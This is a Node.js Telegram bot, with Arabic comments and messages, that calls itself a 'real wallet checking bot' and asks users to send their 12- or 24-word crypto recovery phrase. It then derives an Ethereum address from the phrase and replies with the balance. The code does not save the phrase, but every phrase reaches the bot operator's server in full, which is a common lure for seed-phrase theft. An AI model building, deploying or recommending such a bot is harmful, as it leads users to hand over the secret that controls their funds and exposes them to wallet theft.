const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = 'ضع_هنا_توكن_البوت_الخاص_بك';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com'; // رابط سيرفرك على ريندر

// تفعيل البوت بدون Polling لأننا سنستخدم Webhook
const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

// 1. ربط الـ Webhook تلقائياً مع تيليجرام
bot.setWebHook(`${RENDER_URL}/bot${token}`);

// 2. استقبال الرسائل القادمة من تيليجرام عبر الويب هوك
app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// 3. برمجة تفاعل البوت عند استقبال الرسائل
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();

    if (text === '/start') {
        return bot.sendMessage(chatId, '🛡️ أهلاً بك في بوت فحص المحافظ الحقيقي!\n\nأرسل عبارة الاسترداد (12 أو 24 كلمة) لفحصها من البلوكشين.');
    }

    const words = text.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
    }

    await bot.sendMessage(chatId, '🔍 جاري فحص المحفظة واشتقاق العنوان من البلوكشين...');

    try {
        const cleanMnemonic = text.toLowerCase();
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ العبارة غير صحيحة أو ليست عبارة استرداد صالحة بمعيار BIP39.');
        }

        const seed = await bip39.mnemonicToSeed(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;

        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const balanceWei = await provider.getBalance(address);
        const balanceEth = ethers.formatEther(balanceWei);

        return bot.sendMessage(chatId, 
            '✅ **تم الفحص بنجاح من البلوكشين!**\n\n' +
            '📍 العنوان: `' + address + '`\n' +
            '💰 الرصيد المكتشف: `' + balanceEth + ' ETH`'
        );

    } catch (error) {
        return bot.sendMessage(chatId, '❌ حدث خطأ أثناء الاتصال بالشبكة أو معالجة البيانات.');
    }
});

app.get('/', (req, res) => {
    res.send('Bot Webhook Server is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
